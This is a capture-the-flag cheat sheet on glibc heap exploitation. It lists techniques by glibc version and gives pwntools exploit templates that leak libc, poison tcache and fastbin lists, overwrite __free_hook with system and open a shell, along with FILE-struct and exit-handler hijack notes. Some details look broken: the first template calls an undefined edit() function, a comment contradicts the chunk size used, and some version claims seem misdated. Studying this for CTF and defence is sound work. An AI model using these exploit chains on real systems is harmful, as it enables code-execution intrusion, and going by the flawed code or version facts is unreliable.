# Heap Exploitation (Heap Pwn)

## glibc Version Differences (must read)

All heap exploitation techniques are strongly tied to the glibc version. Confirm the version first:

```bash
./libc.so.6 | head -1
# GNU C Library (Ubuntu GLIBC 2.31-0ubuntu9.9) stable release version 2.31.

# or via strings
strings ./libc.so.6 | grep "GNU C Library"
```

| glibc version | Key change | Impact |
|-----------|---------|------|
| 2.26 and earlier | no tcache | unsorted/fastbin is the main battlefield |
| 2.27 | **tcache introduced** | tcache poisoning is extremely simple |
| 2.29 | unsorted bin unlink hardening (chunk size check) | unsorted bin attack removed |
| 2.31 | tcache multiple checks (key field) | tcache poisoning slightly more complex |
| 2.32 | **safe-linking** (fd pointer XOR PROTECT_PTR) | need to leak heap base first |
| 2.34 | **__free_hook / __malloc_hook removed** | switch to FILE struct / exit handlers |
| 2.35+ | further hardening | same as 2.34, FILE path still usable |

## tcache poisoning (2.27 - 2.31)

### Principle

tcache is a per-thread cache, one singly-linked list per size class (only fd).
Before 2.29, the double-free check only looks at whether the list head is itself, not a full traversal.

### Exploit Template (2.27 - 2.31)

```python
from pwn import *

p = process('./vuln')
libc = ELF('./libc.so.6')

def add(idx, size, data=b'a'):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'idx: ', str(idx).encode())
    p.sendlineafter(b'size: ', str(size).encode())
    p.sendafter(b'data: ', data)

def free(idx):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'idx: ', str(idx).encode())

def show(idx):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'idx: ', str(idx).encode())
    return p.recvline().strip()

# === Step 1: leak libc base ===
# allocate a chunk larger than the tcache range (>0x408), free into unsorted bin, leaving a main_arena pointer
for i in range(8):
    add(i, 0x80)
add(8, 0x80)  # prevent consolidation
for i in range(7):
    free(i)
free(7)       # the 8th goes into the unsorted bin, fd/bk point to main_arena+96
add(9, 0x80)  # carve part of it back, keep the fd
leak = u64(show(9).ljust(8, b'\x00'))
libc.address = leak - 0x3ebca0  # main_arena+96 offset, glibc 2.27 amd64
log.success(f'libc = {hex(libc.address)}')

# === Step 2: tcache poisoning → write __free_hook ===
add(10, 0x30)
add(11, 0x30)
free(10)
free(11)
# use UAF to change chunk11's fd to point at __free_hook
edit(11, p64(libc.sym['__free_hook']))
add(12, 0x30)  # take out chunk11
add(13, 0x30, p64(libc.sym['system']))  # what comes out is the __free_hook address; write system

# trigger: free a chunk whose content is "/bin/sh\x00"
add(14, 0x30, b'/bin/sh\x00')
free(14)

p.interactive()
```

## safe-linking bypass (2.32+)

```text
Principle: tcache/fastbin fd is XORed with PROTECT_PTR on write:
    PROTECT_PTR(pos, ptr) = (pos >> 12) ^ ptr

Bypass:
1. must first leak a heap address (heap base)
2. compute the obfuscated value: fake_fd_obf = (chunk_addr >> 12) ^ target
3. write it in
```

```python
def protect_ptr(pos, ptr):
    return (pos >> 12) ^ ptr

# leak heap base (unsorted bin residue / tcache fd residue)
heap_base = leaked_heap & ~0xfff

# poisoning
fake_fd = protect_ptr(heap_base + chunk_off, target_addr)
edit(chunk_id, p64(fake_fd))
```

## fastbin attack (traditional, mainly 2.26 and earlier)

```text
Key points:
1. fastbin singly-linked list (only fd), no size check besides the chunk size having to match
2. after 2.27, tcache takes priority; fastbin is only used when tcache is full
3. still need to fake a memory region that looks like a chunk (size field = real chunk size, ± some)
```

```python
# double free
add(0, 0x60)
add(1, 0x60)
free(0)
free(1)
free(0)  # fastbin: 0 → 1 → 0

# change fd to a fake chunk (requires the size bytes at fake_addr + 8 to match 0x70)
add(2, 0x60, p64(fake_addr))
add(3, 0x60)
add(4, 0x60)  # take out the chunk at fake_addr
```

## unsorted bin attack (2.28 and earlier only)

```text
Principle: write any address as main_arena+88
2.29 added the bck->fd == victim check; cannot be bypassed
Use: overwrite global_max_fast so small chunks also go through fastbin → combine with fastbin attack
```

```python
# allocate an unsorted-size chunk
add(0, 0x100)
add(1, 0x100)  # prevent top consolidation
free(0)
# UAF: change bk pointer to target - 0x10
edit(0, p64(0) + p64(target - 0x10))
add(2, 0x100)  # take from unsorted → unlink → main_arena+88 written to target
```

## large bin attack

```text
Principle: large bin has one more layer than unsorted: fd_nextsize / bk_nextsize
2.32 also added chunk size checks, but it can still overwrite global_max_fast, _IO_list_all, etc.
Advanced technique, often used in combos like House of Husk
```

## House of XXX Cheatsheet

| Name | Compatible versions | Core idea |
|------|---------|---------|
| House of Force | 2.28 and earlier | change top chunk size to a huge value → malloc any address |
| House of Lore | all versions | forge a small bin chain → return any address |
| House of Orange | 2.23-2.30 | unsorted attack to change _IO_list_all, trigger _IO_flush_all_lockp |
| House of Roman | 2.23-2.26 | 12-bit brute force + fastbin attack to __malloc_hook |
| House of Einherjar | all versions | forge prev_size + PREV_INUSE=0 → backward consolidation |
| House of Botcake | 2.27+ | tcache + unsorted bin combo, bypass tcache double-free check |
| House of Husk | 2.27+ | modify printf's hook table (__printf_function_table) |
| House of Cat | 2.34+ | _IO_wfile_seekoff vtable exploitation, for hookless versions |
| House of Apple | 2.34+ | _IO_wfile_jumps + setcontext gadget |

## Real Exploitation Steps (generic 4 steps)

```text
Step 1: leak heap base
  - allocate a chunk → free into tcache (2.32+ keeps obfuscated fd) → show → derive heap
  - or: allocate a large chunk → free into unsorted → carve back → show fd

Step 2: leak libc base
  - free a large chunk into the unsorted bin, fd/bk leaves a main_arena address
  - show → leak → libc.address = leak - main_arena_offset

Step 3: control IP
  - 2.27-2.33: tcache/fastbin poisoning → write __free_hook or __malloc_hook
  - 2.34+: FILE struct attack (_IO_2_1_stdout_ / stderr), change vtable → _IO_wfile_jumps
  - or: hijack exit handlers (__exit_funcs / tls_dtor_list)

Step 4: getshell
  - free_hook = system, free("/bin/sh") → shell
  - 2.34+: setcontext + 53 gadget → rop chain in heap → execve
```

## Alternative Paths After libc 2.34+ Removed Hooks

### FILE struct attack (_IO_2_1_stdout_ / _IO_2_1_stderr_)

```text
Goal: when the program calls puts/printf, it eventually reaches _IO_file_xsputn → _IO_OVERFLOW → calls the vtable
Hijack:
  1. overwrite the vtable pointer of _IO_2_1_stderr_ to point at a forged vtable
  2. forge the vtable so the __overflow field points to system or setcontext
  3. make the first 8 bytes of fp (FILE*) itself be "/bin/sh\x00" (as system's rdi)
Trigger: any puts/printf/abort/exit flushes stderr
```

### Exit handlers (`__exit_funcs` / `tls_dtor_list`)

```text
Principle: __run_exit_handlers walks the __exit_funcs list, calling each dtor
Hijack: change a list node's func pointer to system, arg to "/bin/sh"
Note: 2.34+ added PTR_DEMANGLE; you need to leak the fs:[0x30] guard value in tls to forge it
```

### tls_dtor_list (more modern)

```text
__call_tls_dtors walks the list, similar structure, must also bypass PTR_DEMANGLE
Applies when: program exit path — more general than the FILE attack
```

## pwndbg / GEF Heap Debugging Commands

```text
# pwndbg
heap              # show all chunks in the current arena
bins              # show tcache / fastbin / unsorted / small / large bins
tcache            # view tcache alone
find_fake_fast <addr> <size>  # find an fd write point usable as a fake chunk
vis_heap_chunks   # visualize the heap layout

# GEF
heap chunks
heap bins fast
heap bins tcache
heap chunk <addr>
```

## Typical pwntools Template (heap menu challenge)

```python
from pwn import *

context.binary = elf = ELF('./vuln')
libc = ELF('./libc.so.6')

p = process('./vuln') if not args.REMOTE else remote('host', 1337)

# IO wrappers
def menu(choice):
    p.sendlineafter(b'choice:', str(choice).encode())

def add(idx, size, data=b'\n'):
    menu(1)
    p.sendlineafter(b'idx:', str(idx).encode())
    p.sendlineafter(b'size:', str(size).encode())
    if data != b'\n':
        p.sendafter(b'data:', data)

def free(idx):
    menu(2)
    p.sendlineafter(b'idx:', str(idx).encode())

def show(idx):
    menu(3)
    p.sendlineafter(b'idx:', str(idx).encode())
    return p.recvline().strip()

def edit(idx, data):
    menu(4)
    p.sendlineafter(b'idx:', str(idx).encode())
    p.sendafter(b'data:', data)

# === choose the technique stack based on the vulnerability type ===
```

## Notes

- **glibc version is the primary question** — the same binary with a 2.27 libc vs a 2.34 libc has completely different exploitation paths
- **tcache capacity = 7** (per size class) — only when 7 are sprayed does it overflow into unsorted/fastbin
- **chunk size = user request + 0x10 header, aligned to 0x10** (excluding the 0x10 header, actually writable exceeds 0x8 because the next chunk's prev_size is reused)
- **remote heap spraying is unstable** — forked-server models may have different brk/mmap per connection; run randomization tests
- **don't leave unsorted residue in the attack chain** — a main_arena pointer appearing in an unexpected chunk garbles later show output
- **safe-linking error rate** — when computing PROTECT_PTR remember it's `pos >> 12`, where pos is the address being written to, not the address being pointed at

